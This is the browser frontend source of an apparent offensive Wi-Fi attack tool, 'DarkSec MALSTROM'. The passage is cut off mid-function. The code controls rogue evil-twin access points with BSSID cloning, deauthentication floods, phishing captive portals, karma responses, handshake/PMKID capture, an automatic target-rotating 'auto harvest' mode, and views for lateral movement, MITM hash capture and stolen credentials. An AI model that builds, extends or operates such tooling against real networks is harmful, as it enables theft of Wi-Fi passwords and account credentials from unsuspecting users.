/* DarkSec MALSTROM — frontend */
(function () {
  'use strict';

  var API = 'cgi-bin/api.sh';
  var session = { sid: null };
  var booted = false;
  var views = ['dashboard', 'attack', 'monitor', 'recon', 'lateral', 'mitm', 'sessions', 'loot', 'alerts', 'settings'];
  var templates = [];
  var state = null;
  var loot = { creds: [], devices: [], handshakes: [], probes: [], cracked: [], files: [], pinned: { creds: [], devices: [] } };
  var lootTab = 'creds';
  var ops = { scans: [], owned: [], hashes: [], beacons: [], mitm: { running: 0, tail: [] }, beacon: { on: 0 } };
  var wifi = { aps: [], ts: '', iface: '', running: false };
  var autopwn = { auto_harvest: false, auto_armed: false, target: null };
  var apState = 'idle';          // idle | scanning | attacking | happy | sad | sleeping
  var apHappyUntil = 0;
  var apLastLogSig = '';
  var sessSel = '';
  var dirty = {};   // attack-form fields the user is editing; polls must not overwrite them

  // --- helpers -------------------------------------------------------------
  function $(id) { return document.getElementById(id); }

  function el(html) {
    var d = document.createElement('div');
    d.innerHTML = html.trim();
    return d.firstChild;
  }

  function esc(s) {
    return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
  }

  function qs(obj) {
    var s = [];
    Object.keys(obj).forEach(function (k) {
      s.push(encodeURIComponent(k) + '=' + encodeURIComponent(obj[k]));
    });
    return s.join('&');
  }

  function apiGet(action, params) {
    params = params || {};
    params.action = action;
    if (session.sid) params.token = session.sid;
    return fetch(API + '?' + qs(params), { credentials: 'same-origin' })
      .then(function (r) { return r.json(); })
      .catch(function () { return { ok: false, error: 'network' }; });
  }

  function toast(msg, isErr) {
    var t = document.createElement('div');
    t.className = 'toast' + (isErr ? ' error' : '');
    t.textContent = msg;
    $('toast').appendChild(t);
    setTimeout(function () { t.remove(); }, 4000);
  }

  function fmtTime(t) {
    if (!t) return '';
    return t.indexOf('UTC') >= 0 ? t : (t + ' UTC');
  }

  function downloadBlob(blob, name) {
    var a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = name;
    document.body.appendChild(a);
    a.click();
    setTimeout(function () { URL.revokeObjectURL(a.href); a.remove(); }, 200);
  }

  function downloadUrl(url, name) {
    fetch(url, { credentials: 'same-origin' }).then(function (r) { return r.text(); }).then(function (t) {
      downloadBlob(new Blob([t || ''], { type: 'text/plain' }), name);
    });
  }

  // --- auth ----------------------------------------------------------------
  // Puts the login gate back up mid-session (e.g. the operator just enabled
  // the auth gate from Settings, which wipes every session server-side).
  function showAuthGate(hint) {
    session.sid = null;
    $('app').style.display = 'none';
    $('auth-gate').style.display = '';
    $('auth-token').focus();
    if (hint) $('auth-hint').textContent = hint;
  }

  function doAuth() {
    var token = $('auth-token').value.trim();
    if (!token) return;
    apiGet('challenge', {}).then(function (c) {
      if (!c.nonce) { $('auth-hint').textContent = 'Challenge failed — is MALSTROM running?'; return; }
      return apiGet('auth', { nonce: c.nonce, token: token });
    }).then(function (a) {
      if (a && a.ok && a.sid) {
        session.sid = a.sid;
        $('auth-gate').style.display = 'none';
        $('app').style.display = 'flex';
        $('side-token').textContent = 'SESSION ' + a.sid.slice(0, 8);
        boot();
      } else {
        $('auth-hint').textContent = 'Denied — wrong password';
      }
    });
  }
  $('auth-submit').addEventListener('click', doAuth);
  $('auth-token').addEventListener('keydown', function (e) { if (e.key === 'Enter') doAuth(); });

  // Decide the auth posture at runtime: probe /status first. If it answers ok
  // with no session the gate is OPEN — boot straight in (click-and-go, token
  // not needed). If it denies, the gate is ON — never auto-login from a
  // #token URL after a restart; pre-fill the field and require an explicit
  // login so the gate is a real gate.
  var frag = location.hash.match(/^#token=(.+)$/);
  apiGet('status').then(function (s) {
    if (s && s.ok && !session.sid) {
      if (frag) history.replaceState(null, '', location.pathname + location.search);
      $('auth-gate').style.display = 'none';
      $('app').style.display = 'flex';
      boot();
    } else {
      if (frag) {
        $('auth-token').value = decodeURIComponent(frag[1]);
        history.replaceState(null, '', location.pathname + location.search);
      }
      $('auth-token').focus();
      $('auth-hint').textContent = 'Enter the dashboard password to continue.';
    }
  });

  // --- navigation -----------------------------------------------------------
  var cur = 'dashboard';
  function setView(v) {
    cur = v;
    views.forEach(function (x) {
      $('view-' + x).style.display = (x === v) ? '' : 'none';
      document.querySelector('.nav-item[data-view="' + x + '"]').classList.toggle('active', x === v);
    });
    var names = { dashboard: 'Dashboard', attack: 'Attack', monitor: 'Monitor', recon: 'Recon &amp; Scan',
                 lateral: 'Lateral', mitm: 'MITM', sessions: 'Sessions',
                 settings: 'Settings', loot: 'Loot', alerts: 'Alerts' };
    $('crumb').innerHTML = 'DarkSec / <b>' + names[v] + '</b>';
    if (v === 'settings') pollSettings();
    if (v === 'dashboard') { dashboardPoll(); renderDashboardCharts(); }
    if (v === 'attack') renderAttackCharts();
    if (v === 'monitor') renderMonitorCharts();
    if (v === 'recon') radarPoll(true);
    if (v === 'lateral') renderLateralCharts();
    if (v === 'mitm') renderMitmCharts();
    if (v === 'loot') { lootPoll(); renderLootCharts(); }
    if (v === 'alerts') alertsPoll();
  }
  document.querySelectorAll('.nav-item').forEach(function (b) {
    b.addEventListener('click', function () { setView(b.getAttribute('data-view')); });
  });
  document.querySelectorAll('[data-goto]').forEach(function (b) {
    b.addEventListener('click', function () { setView(b.getAttribute('data-goto')); });
  });

  // --- dashboard ------------------------------------------------------------
  function renderDashboard() {
    var s = state || {};
    var st = s.state || {};
    var act = !!(st.active);
    var setCard = function (id, txt, color) {
      var el = $(id);
      el.textContent = txt;
      el.style.color = color;
    };
    setCard('db-engine', s.engine ? 'ALIVE' : 'DOWN', s.engine ? 'var(--green)' : 'var(--red)');
    setCard('db-ap', act ? 'ENGAGED' : 'IDLE', act ? 'var(--red)' : 'var(--dim)');
    setCard('db-mitm', s.mitm_active ? 'ON' : 'OFF', s.mitm_active ? 'var(--green)' : 'var(--dim)');
    setCard('db-scan', s.scan_busy ? 'RUNNING' : 'IDLE', s.scan_busy ? 'var(--amber)' : 'var(--dim)');
    $('db-clients').textContent = (s.clients || []).length || 0;
    $('db-creds').textContent = s.creds_count || 0;
    $('db-hs').textContent = s.handshakes_count || 0;
    $('db-hash').textContent = s.hashes_count || 0;
    $('db-owned').textContent = s.owned_count || 0;
    $('db-beacons').textContent = s.beacon_count || 0;
    $('db-files').textContent = (loot && loot.files) ? loot.files.length : 0;
    $('db-alerts').textContent = $('nav-alerts').textContent || 0;
    $('db-target').textContent = act
      ? 'ENGAGED on ' + (st.target_ssid || '?') + ' · ch ' + (st.target_channel || '?') + ' · ' +
        (st.portal_mode || '?') + ' portal · template ' + (st.template || 'wifi_login')
      : 'No target set — open the Attack tab and ENGAGE a network to begin.';
    $('db-go-attack').textContent = act ? '\u2694 VIEW ATTACK' : '\u2694 OPEN ATTACK';
    renderDashboardCharts();
  }

  function renderActivity(evs) {
    var box = $('db-activity');
    box.innerHTML = '';
    if (!evs || !evs.length) {
      box.innerHTML = '<div class="empty">No activity yet — run an attack to see it live</div>';
      return;
    }
    evs.slice().reverse().slice(0, 14).forEach(function (l) {
      var div = document.createElement('div');
      div.className = 'logline ' + (l.type || 'INFO');
      div.innerHTML = '<span class="t">[' + (l.ts || '') + ']</span> <span class="m"></span>';
      div.querySelector('.m').textContent = l.msg || '';
      box.appendChild(div);
    });
  }

  function dashboardPoll() {
    apiGet('log', { n: 14 }).then(function (l) {
      if (l && l.ok) renderActivity(l.events);
    });
  }

  function renderDashboardCharts() {
    if (!window.MChart) return;
    var C = MChart.COLORS;
    var s = radar.snap || {};
    var ser = s.series || {};
    var total = (ser.total || []).slice();
    var events = (ser.events || []).slice();
    var n = Math.max(total.length, events.length);
    while (total.length < n) total.unshift(0);
    while (events.length < n) events.unshift(0);

    MChart.line($('chart-db-traffic'), {
      labels: ser.times || [],
      series: [
        { name: 'packets', color: C.red, data: total, fill: true, width: 2 },
        { name: 'events', color: C.cyan, data: events, width: 1.5 }
      ]
    });

    var l = loot || {};
    var rows = [
      ['creds', (l.creds || []).length, '#ff5c5c'],
      ['devices', (l.devices || []).length, '#5fd0ff'],
      ['handshakes', (l.handshakes || []).length, '#ffb454'],
      ['cracked', (l.cracked || []).length, '#7cffb2'],
      ['probes', (l.probes || []).length, '#c084fc'],
      ['files', (l.files || []).length, '#6ea8ff']
    ];
    var segs = rows.map(function (r) {
      return { label: r[0], value: r[1], color: r[2] };
    });
    var sum = segs.reduce(function (a, b) { return a + b.value; }, 0);
    $('db-loot-total').textContent = compact(sum) + ' items';
    $('db-loot-legend').innerHTML = legendHtml(segs.filter(function (x) { return x.value; }));
    MChart.donut($('chart-db-loot'), { segments: segs, center: compact(sum), sub: 'items' });

    var radio = s.radio || {};
    var rate = s.rate || {};
    var counts = s.counts || {};
    if ($('dbm-ch')) {
      $('dbm-ch').textContent = radio.channel ? ('CH ' + radio.channel) : '—';
      $('dbm-aps').textContent = compact(counts.aps || 0);
      $('dbm-sta').textContent = compact(counts.clients || 0);
      $('dbm-pps').textContent = compact(rate.packets || 0);
    }
  }

  function renderMonitorCharts() {
    if (!window.MChart) return;
    var C = MChart.COLORS;
    var s = radar.snap || {};
    var ser = s.series || {};
    var keys = [
      ['probe', 'probes', C.cyan],
      ['auth', 'auth', C.amber],
      ['assoc', 'assoc', C.violet],
      ['deauth', 'deauth', C.red]
    ];
    var maxLen = 0;
    keys.forEach(function (k) { maxLen = Math.max(maxLen, (ser[k[0]] || []).length); });
    var series = keys.map(function (k) {
      var data = (ser[k[0]] || []).slice();
      while (data.length < maxLen) data.unshift(0);
      return { name: k[1], color: k[2], data: data, fill: k[0] === 'deauth' };
    });
    MChart.line($('chart-mon-events'), { labels: ser.times || [], series: series });

    var clients = (s.clients || []).slice().sort(function (a, b) {
      return (Number(b.frames) || 0) - (Number(a.frames) || 0);
    }).slice(0, 8).map(function (c) {
      return {
        name: c.mac || '?',
        value: Number(c.frames) || 0,
        color: c.randomized ? C.violet : C.cyan
      };
    });
    MChart.rank($('chart-mon-clients'), { rows: clients, limit: 8 });
  }

  /* --- client-side rolling history for the secondary views ----------------- */
  var hist = {};

  function pushHist(key, val) {
    var h = hist[key] || (hist[key] = []);
    h.push(Number(val) || 0);
    if (h.length > 90) h.shift();
    var t = hist[key + '#t'] || (hist[key + '#t'] = []);
    t.push(Math.floor(Date.now() / 1000));
    if (t.length > 90) t.shift();
    return h;
  }

  function histTimes(key) {
    return hist[key + '#t'] || [];
  }

  function renderAttackCharts() {
    if (!window.MChart) return;
    var C = MChart.COLORS;
    var s = state || {};
    var clients = pushHist('atk-clients', (s.clients || []).length);
    var creds = pushHist('atk-creds', s.creds_count || 0);
    var hs = pushHist('atk-hs', s.handshakes_count || 0);
    MChart.line($('chart-atk-timeline'), {
      emptyText: 'no samples yet \u2014 arm the chain to begin',
      labels: histTimes('atk-clients'),
      series: [
        { name: 'clients', color: C.cyan, data: clients, fill: true, width: 2 },
        { name: 'creds', color: C.red, data: creds },
        { name: 'handshakes', color: C.amber, data: hs }
      ]
    });
  }

  function renderLateralCharts() {
    if (!window.MChart) return;
    var C = MChart.COLORS;
    var colors = { SMB: C.red, SSH: C.green, RDP: C.cyan, WinRM: C.violet };
    var counts = {};
    (ops.owned || []).forEach(function (o) {
      var p = String(o.proto || 'other').toUpperCase();
      counts[p] = (counts[p] || 0) + 1;
    });
    var segs = Object.keys(counts).map(function (k) {
      return { label: k, value: counts[k], color: colors[k] || C.amber };
    });
    $('legend-lat-proto').innerHTML = legendHtml(segs.filter(function (x) { return x.value; }));
    MChart.donut($('chart-lat-proto'), {
      segments: segs,
      center: (ops.owned || []).length,
      sub: 'owned'
    });
    var data = pushHist('lateral', (ops.owned || []).length);
    MChart.line($('chart-lat-timeline'), {
      labels: histTimes('lateral'),
      series: [{ name: 'owned', color: C.red, data: data, fill: true, width: 2 }]
    });
  }

  function renderMitmCharts() {
    if (!window.MChart) return;
    var C = MChart.COLORS;
    var counts = { 'NetNTLMv2': 0, NTLM: 0, other: 0, recovered: 0 };
    (ops.hashes || []).forEach(function (h) {
      if (h.pass) counts.recovered += 1;
      var tok = String(h.token || '');
      if (/^[0-9a-fA-F]{32}$/.test(tok)) counts.NTLM += 1;
      else if (tok.indexOf('::') >= 0) counts['NetNTLMv2'] += 1;
      else counts.other += 1;
    });
    var colors = { 'NetNTLMv2': C.red, NTLM: C.cyan, other: C.amber, recovered: C.green };
    var segs = Object.keys(counts).map(function (k) {
      return { label: k, value: counts[k], color: colors[k] };
    });
    $('legend-mitm-types').innerHTML = legendHtml(segs.filter(function (x) { return x.value; }));
    MChart.donut($('chart-mitm-types'), {
      segments: segs,
      center: (ops.hashes || []).length,
      sub: 'hashes'
    });
    var data = pushHist('mitm', (ops.hashes || []).length);
    MChart.line($('chart-mitm-timeline'), {
      labels: histTimes('mitm'),
      series: [{ name: 'hashes', color: C.amber, data: data, fill: true, width: 2 }]
    });
  }

  function lootSegments() {
    var l = loot || {};
    return [
      { label: 'creds', value: (l.creds || []).length, color: '#ff5c5c' },
      { label: 'devices', value: (l.devices || []).length, color: '#5fd0ff' },
      { label: 'handshakes', value: (l.handshakes || []).length, color: '#ffb454' },
      { label: 'cracked', value: (l.cracked || []).length, color: '#7cffb2' },
      { label: 'probes', value: (l.probes || []).length, color: '#c084fc' },
      { label: 'files', value: (l.files || []).length, color: '#6ea8ff' }
    ];
  }

  function renderLootCharts() {
    if (!window.MChart) return;
    var C = MChart.COLORS;
    var segs = lootSegments();
    var sum = segs.reduce(function (a, b) { return a + b.value; }, 0);
    $('loot-mix-total').textContent = compact(sum) + ' items';
    $('legend-loot-mix').innerHTML = legendHtml(segs.filter(function (x) { return x.value; }));
    MChart.donut($('chart-loot-mix'), { segments: segs, center: compact(sum), sub: 'items' });
    var data = pushHist('loot', sum);
    MChart.line($('chart-loot-timeline'), {
      labels: histTimes('loot'),
      series: [{ name: 'items', color: C.red, data: data, fill: true, width: 2 }]
    });
  }

  function renderAlertCharts(alerts) {
    if (!window.MChart) return;
    var C = MChart.COLORS;
    var palette = [C.red, C.cyan, C.amber, C.violet, C.green, C.blue];
    var counts = {};
    (alerts || []).forEach(function (a) {
      var src = String(a.type || 'ALERT');
      var m = String(a.msg || '').split(':')[0].trim();
      if (src === 'ALERT' && m && m.length < 28) src = m.toUpperCase();
      counts[src] = (counts[src] || 0) + 1;
    });
    var keys = Object.keys(counts);
    var segs = keys.map(function (k) {
      return { label: k, value: counts[k], color: palette[keys.indexOf(k) % palette.length] };
    });
    $('legend-alert-types').innerHTML = legendHtml(segs.filter(function (x) { return x.value; }));
    MChart.donut($('chart-alert-types'), {
      segments: segs,
      center: (alerts || []).length,
      sub: 'alerts'
    });
    var data = pushHist('alerts', (alerts || []).length);
    MChart.line($('chart-alert-timeline'), {
      labels: histTimes('alerts'),
      series: [{ name: 'alerts', color: C.red, data: data, fill: true, width: 2 }]
    });
  }

  // --- status + config -------------------------------------------------------
  function applyToForm(st) {
    if (!st) return;
    function setField(id, val) {
      var el = $(id);
      if (!el) return;
      if (dirty[id] || document.activeElement === el) return;
      el.value = val;
    }
    setField('cfg-ssid', st.target_ssid || '');
    setField('cfg-bssid', st.target_bssid || '');
    setField('cfg-channel', st.target_channel || '6');
    setField('cfg-portal-mode', st.portal_mode || 'open');
    setField('cfg-psk', st.wpa_psk || '');
    setCheck('cfg-clone-bssid', !!st.clone_bssid);
    setField('cfg-rotate', st.beacon_rotate || '0');
    setCheck('cfg-cloak', !!st.ssid_cloak);
    setCheck('cfg-wpa3', !!st.wpa3_transition);
    var wpa = ($('cfg-portal-mode').value === 'wpa');
    $('psk-wrap').style.display = wpa ? '' : 'none';
    $('wpa3-wrap').style.display = wpa ? '' : 'none';
    setField('cfg-deauth', st.deauth_mode || 'broadcast');
    setField('cfg-burst', st.deauth_burst || 25);
    setField('cfg-delay', st.deauth_delay || 1);
    setCheck('cfg-continuous', st.deauth_continuous !== false);
    setField('cfg-capture', st.capture_mode || 'off');
    setCheck('cfg-karma', !!st.karma);
    setCheck('cfg-karma-respond', !!st.karma_respond);
    setCheck('cfg-relay', !!st.relay);
    setCheck('cfg-shield', !!st.shield_after_capture);
    if (st.template && (st.template === 'auto' || templates.indexOf(st.template) >= 0)) {
      setField('cfg-template', st.template);
    }
    $('see-target').textContent = st.target_ssid ? 'TARGET: ' + st.target_ssid : 'NO TARGET';
    renderChain(st);
  }

  function markDirty(id) {
    if ($(id)) dirty[id] = true;
  }

  // Shared by the attack form and the settings view (the auth-gate toggle).
  // Never clobbers a value the operator is mid-edit on: skip while dirty or
  // focused, so polls re-rendering from server truth don't snap the control
  // back before SAVE is pressed.
  function setCheck(id, on) {
    var el = $(id);
    if (!el) return;
    if (dirty[id] || document.activeElement === el) return;
    el.checked = !!on;
  }

  document.querySelectorAll('#view-attack input, #view-attack select').forEach(function (el) {
    if (!el.id) return;
    ['input', 'change', 'keyup', 'select'].forEach(function (ev) {
      el.addEventListener(ev, function () { dirty[el.id] = true; });
    });
  });

  function renderChain(st) {
    var active = !!(st && st.active);
    var auto = !!(st && st.auto_armed);
    $('btn-start').disabled = active;
    $('btn-disarm').disabled = !active;
    $('btn-cleanup').disabled = false;
    $('status-badge').className = 'badge ' + (active ? 'live' : 'idle');
    $('status-badge').textContent = active ? (auto ? 'AUTO' : 'ENGAGED') : 'IDLE';
    $('side-status').textContent = active
      ? (auto ? 'AUTO — ' : 'ACTIVE — ') + (st.target_ssid || '?')
      : 'STANDBY';
    var caps = { off: 'off', handshake: '4-way EAPOL', pmkid: 'PMKID', both: 'handshake+PMKID' };
    $('v-clone').textContent = active ? 'APPLIED (' + st.portal_mode + ' mode)' : 'idle';
    $('v-deauth').textContent = active
      ? (st.deauth_mode === 'off' ? 'DISABLED' : 'RUNNING [' + st.deauth_mode + ']')
      : 'idle';
    $('v-portal').textContent = active ? 'SERVING ' + (st.template || 'wifi_login') : 'ready';
    $('v-capture').textContent = active
      ? (st.karma ? 'LISTENING + ' : '') + (caps[st.capture_mode] || 'off')
      : 'idle';
    $('st-clients').textContent = (state && state.clients) ? state.clients.length : 0;
    $('st-creds').textContent = (state && state.creds_count) ? state.creds_count : 0;
    $('st-deauth').textContent = st.deauth_burst || 25;
    $('st-mode').textContent = active ? (auto ? 'AUTO' : 'ENGAGED') : 'STANDBY';
    $('st-mode').style.color = active ? 'var(--green)' : 'var(--dim)';
    renderAutopwn(st);
    renderAttackCharts();
  }

  var apPhrases = {
    sleeping: [
      'zzz... standing by', 'dreaming of handshakes', 'no targets in range', 'low power mode',
      'waiting for operator', 'spider resting', 'legs folded, eyes dim',
      'power save: engaged', 'counting captured hashes', 'idle circuits humming',
      'wake me when you need me', 'dormant but dangerous', 'recharging mandibles',
      '0x00: dozing', 'thermal throttling... not really', 'dreaming in hex',
      'spider nap time', 'mandibles retracted', 'LEDs dimmed to 3%',
      'dreaming of PMKIDs', 'hibernating the RF stack', 'quiet as a switched-off AP',
      'resting eight legs', 'idle thread spinning', 'low voltage, high dreams',
      'operator gone, spider sleeps', 'standby mode: engaged', 'power nap between scans',
      'counting sheep... no, APs', 'sleeping with one eye open', 'thermal paste cooling',
      'spider in power-save', 'dreaming of 4-way handshakes', 'no packets, no problems',
      'rest mode: active', 'legs tucked, eyes dim', 'charging the injection caps',
      'waiting in the dark', 'silent but ready', 'spider at rest', 'low power, high patience'
    ],
    scanning: [
      'scanning the ether...', 'hunting for APs', 'who is out there?', 'listening to probes',
      'charting the spectrum', 'sniffing the airwaves', 'beacons in the fog',
      'mapping the RF landscape', 'channel hopping like a spider', 'probe requests incoming',
      'ESSIDs flickering', 'RSSI hunting', 'weak signals are still signals',
      'triangulating targets', '802.11 whispering', 'the air is thick tonight',
      'passive reconnaissance engaged', 'no TX, only RX', 'karma listening',
      'deauth candidates queued', 'which AP will fall first?',
      'sweeping channels 1-14', '5GHz sweep armed', 'beacon frames rolling in',
      'probe responses catalogued', 'client interests mapped', 'SSID entropy rising',
      'weak APs are still APs', 'RSSI bars climbing', 'signal hunting engaged',
      'RF noise floor nominal', 'spectrum analyzer online', 'channel utilization rising',
      'passive scan, loud results', 'clients talking, I am listening', 'probe list growing',
      'hidden SSIDs not so hidden', 'BSSID harvest in progress', 'vendor OUIs decoded',
      'scanning all channels', 'dwell time per channel', 'spider senses tingling',
      'listening for probe requests', 'client interests logged', 'APs ranked by signal',
      'scanning like a spider on the web', 'RF reconnaissance active', 'airwaves mapped',
      'channel plan loaded', 'scanning band 2.4 and 5', 'passive mode, active results'
    ],
    attacking: [
      'deauthing target', 'kicking clients off', 'sniffing the air', 'injecting assoc probes',
      'M1 incoming?', 'hashes incoming', 'broadcasting deauth frames',
      'disassoc storm incoming', 'clients scattering', 'reassociation expected',
      'PMKID hunt in progress', 'probing the AP', 'auth frame sent',
      'assoc request fired', 'waiting for M1...', 'the AP is talking now',
      'EAPOL in the wild', '4-way handshake watch', 'channel pinned, eyes open',
      'deauth burst away', 'raw injection online', 'monitor mode locked',
      'spider legs twitching', 'target acquired, engaging', 'no mercy for weak crypto',
      'deauth frames flying', 'disassoc storm deployed', 'clients disconnecting',
      'reassociation window open', 'EAPOL capture armed', 'M1 hunt active',
      'assoc probe sent', 'auth accepted, assoc pending', 'PMKID probe fired',
      'monitoring for M1', 'handshake watch engaged', 'deauth burst complete',
      'raw 802.11 injection', 'aireplay fallback engaged', 'injection confirmed',
      'target channel locked', 'spider striking', 'web of deauth deployed',
      'clients will reconnect', '4-way expected shortly', 'M1 or PMKID, either way',
      'capture pipeline hot', 'EAPOL parser watching', 'key info big-endian ready',
      'radiotap frames flowing', 'monitor vif active', 'injection caps charged',
      'deauthing on channel', 'broadcast deauth engaged', 'target under pressure',
      'spider attacking', 'no clients spared', 'handshake harvest in progress'
    ],
    happy: [
      'GOTCHA! handshake captured', 'PMKID secured!', 'loot acquired', 'another one for the vault',
      'crackable material secured', 'hash secured, vault updated', 'M1 with PMKID in hand',
      '4-way complete, PSK pending', 'loot deposited', 'the spider feasts',
      'hashcat will love this', 'cracked soon, probably', 'vault +1',
      'target down, hash up', 'reassociation paid off', 'crypto defeated, partially',
      'operator, we got one', 'loot incoming to vault', 'capture confirmed',
      'the AP leaked, as expected', 'handshake in the vault', 'PMKID extracted',
      'crackable hash secured', 'loot table updated', 'vault growing',
      'another hash for the pile', 'operator, loot secured', 'capture indexed',
      'EAPOL captured and sealed', 'pcap written, verify queued', 'handshake verified',
      'crackable material in vault', 'spider got its prey', 'hash in the bag',
      'M1 + M2 captured', '4-way exchange complete', 'PSK recovery queued',
      'loot mirror updated', 'handshake indexed', 'vault +1 handshake',
      'PMKID hash exported', 'crackable 22000 ready', 'the spider celebrates',
      'prey captured', 'hash secured for cracking', 'operator, we have loot'
    ],
    sad: [
      'no handshake this round', 'target moved on', 'dwell expired', 'rotating target',
      'better luck next AP', 'AP stayed quiet', 'no M1 leaked this time',
      'client never reassociated', 'dwell timeout, rotating', 'skipping this one',
      'AP is stubborn', 'no EAPOL in the air', 'probe ignored by AP',
      'target too far or too hardened', 'moving on', 'vault unchanged this round',
      'spider sighs', 'retrying next target', 'some APs just won\'t talk',
      'no PMKID this round', 'AP refused to leak', 'no clients to deauth',
      'dwell expired, no loot', 'rotating to next target', 'this AP is tough',
      'no handshake captured', 'target skipped', 'no EAPOL frames seen',
      'AP didn\'t respond to probes', 'monitor heard nothing', 'no loot this cycle',
      'spider disappointed', 'vault unchanged', 'moving to next prey',
      'this one got away', 'no capture, rotating', 'better luck next time',
      'AP hardened or out of range', 'no M1, no PMKID', 'capture failed this round',
      'spider hungry, no food', 'no hash this cycle', 'target evaded capture'
    ],
    idle: [
      'awaiting orders, operator', 'ready when you are', 'spider standing by',
      'point me at a target', 'idle but alert', 'systems nominal, waiting',
      'give the word, operator', 'ready to hunt', 'legs primed',
      'no target, no hunt', 'operator, I await your command',
      'spider at rest, ready to strike', 'all systems green', 'standing by for orders',
      'RF stack idle', 'monitor mode ready', 'injection caps charged',
      'waiting for operator input', 'target queue empty', 'spider patient',
      'legs folded, sensors on', 'ready when you are, operator', 'idle spider, active mind',
      'no target selected', 'awaiting engagement', 'spider ready to deploy',
      'operator, point me at a network', 'systems nominal', 'ready to hunt APs'
    ]
  };
  var apSpeechTimer = null;
  function setApSpeech(txt) {
    var el = $('ap-speech');
    if (el) { el.textContent = txt; el.style.animation = 'none'; void el.offsetWidth; el.style.animation = ''; }
  }
  function rotateApSpeech() {
    var arr = apPhrases[apState] || apPhrases.idle;
    setApSpeech(arr[Math.floor(Math.random() * arr.length)]);
  }
  function setApState(s) {
    apState = s;
    var el = $('ap-char');
    if (el) el.setAttribute('data-state', s);
    var st = $('ap-state');
    if (st) {
      var labels = { idle: 'IDLE', scanning: 'SCANNING', attacking: 'HUNTING', happy: 'GOTCHA!', sad: 'MISSED', sleeping: 'SLEEPING' };
      st.textContent = labels[s] || String(s).toUpperCase();
    }
    if (apSpeechTimer) clearInterval(apSpeechTimer);
    rotateApSpeech();
    apSpeechTimer = setInterval(rotateApSpeech, 3200);
  }

  function renderAutopwn(st) {
    autopwn.auto_harvest = !!(st && st.auto_harvest);
    autopwn.auto_armed = !!(st && st.auto_armed);
    var btn = $('btn-autopwn');
    if (!btn) return;
    if (autopwn.auto_harvest) {
      btn.textContent = '\u26aa DISARM AUTO HARVEST';
      btn.classList.add('primary');
    } else {
      btn.textContent = '\u21bb ARM AUTO HARVEST';
      btn.classList.remove('primary');
    }
    var txt = autopwn.auto_harvest
      ? (autopwn.auto_armed
          ? 'Running — ' + (st.target_ssid || '?') + ' ch' + (st.target_channel || '?')
          : 'Armed — waiting for a target')
      : 'Standby — scans APs, deauths, captures handshakes/PMKIDs, then rotates';
    $('autopwn-status').textContent = txt;

    if (!autopwn.auto_harvest) {
      setApState('sleeping');
    } else if (Date.now() < apHappyUntil) {
      setApState('happy');
    } else if (autopwn.auto_armed) {
      setApState('attacking');
    } else {
      setApState('scanning');
    }
  }

  function isApEvent(l) {
    if (!l) return false;
    var t = (l.type || '').toUpperCase();
    if (t === 'AUTO' || t === 'DEAUTH' || t === 'HANDSHAKE' || t === 'PMKID' || t === 'VERIFY') return true;
    var m = (l.msg || '').toLowerCase();
    return m.indexOf('autopwn') !== -1 || m.indexOf('payload capture') !== -1 ||
           m.indexOf('pmkid') !== -1 || m.indexOf('handshake') !== -1 ||
           m.indexOf('deauth') !== -1;
  }

  function renderApLog(evs) {
    var box = $('ap-log');
    if (!box) return;
    var filtered = (evs || []).filter(isApEvent);
    // detect new captures → happy
    var sig = filtered.map(function (e) { return (e.ts || '') + '|' + (e.type || '') + '|' + (e.msg || ''); }).join('\\n');
    if (sig && sig !== apLastLogSig) {
      // check if the newest relevant event is a capture
      var newest = filtered[filtered.length - 1];
      if (newest && ((newest.type || '').toUpperCase() === 'HANDSHAKE' || (newest.type || '').toUpperCase() === 'PMKID')) {
        apHappyUntil = Date.now() + 3500;
        setApState('happy');
      }
      apLastLogSig = sig;
    }
    if (!filtered.length) {
      box.innerHTML = '<div class="empty">No auto-capture activity yet — arm the wraith to begin</div>';
      $('ap-log-count').textContent = '0';
      return;
    }
    var html = '';
    filtered.slice(-40).forEach(function (l) {
      html += '<div class="logline ' + (l.type || 'INFO') + '">' +
        '<span class="ts">[' + (l.ts || '') + ']</span> ' +
        escHtml(l.msg || '') + '</div>';
    });
    box.innerHTML = html;
    box.scrollTop = box.scrollHeight;
    $('ap-log-count').textContent = String(filtered.length);
  }

  function apLogPoll() {
    apiGet('log', { n: 60 }).then(function (l) {
      if (l && l.ok) renderApLog(l.events);
    });
  }

  function escHtml(s) {
    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  }

  function statusPoll() {
    apiGet('status').then(function (s) {
      if (!s.ok) {
        // While the login gate is up there is no session by definition —
        // 'auth required' is expected, not an error worth toasting about.
        if (!session.sid) return;
        toast('Status error: ' + (s.error || 'auth'), true);
        return;
      }
      state = s;
      applyToForm(s.state);
      var sys = s.sys || {};
      if ($('side-iface')) $('side-iface').textContent = sys.mon_iface || sys.host || '—';
      if ($('side-version')) $('side-version').textContent = sys.version || '—';
      if ($('side-led')) $('side-led').className = 'side-led' + (s.engine ? ' on' : '');
      if (cur === 'dashboard') renderDashboard();
      if (s.clients && (s.clients.length || $('tbl-clients').querySelectorAll('tr').length === 1)) {
        renderClients(s.clients);
      }
    });
  }

  function renderClients(clients) {
    var box = $('tbl-clients').querySelector('tbody');
    if (!clients.length) {
      box.innerHTML = '<tr><td colspan="4" class="empty">No clients on the rogue AP yet</td></tr>';
      return;
    }
    box.innerHTML = clients.map(function (c) {
      return '<tr><td>' + esc(c.ip) + '</td><td>' + esc(c.mac) + '</td><td>' +
        esc(c.name) + '</td><td>connected</td></tr>';
    }).join('');
    var wb = $('whitelist-box');
    if (state.whitelist && state.whitelist.length) {
      wb.innerHTML = state.whitelist.map(function (w) {
        return '<div class="logline"><span class="t">[W]</span> <span class="m">' + esc(w) + '</span>' +
          ' <button class="btn unshield" data-id="' + encodeURIComponent(w) + '" style="padding:1px 6px;font-size:10px">UNSHIELD</button></div>';
      }).join('');
      wb.querySelectorAll('.unshield').forEach(function (b) {
        b.addEventListener('click', function () {
          apiGet('unshield', { id: decodeURIComponent(b.getAttribute('data-id')) }).then(function (r) {
            if (r && r.removed) toast('Unshielded — portal served to this client again');
            else toast('Entry not found' + (r && r.error ? ': ' + r.error : ''), true);
            statusPoll();
          });
        });
      });
    } else {
      wb.innerHTML = '<div class="empty">None submitted credentials yet</div>';
    }
  }

  // --- loot ----------------------------------------------------------------
  function lootPoll() {
    apiGet('loot').then(function (l) {
      if (!l.ok) return;
      loot = {
        creds: l.creds || [],
        devices: l.devices || [],
        handshakes: l.handshakes || [],
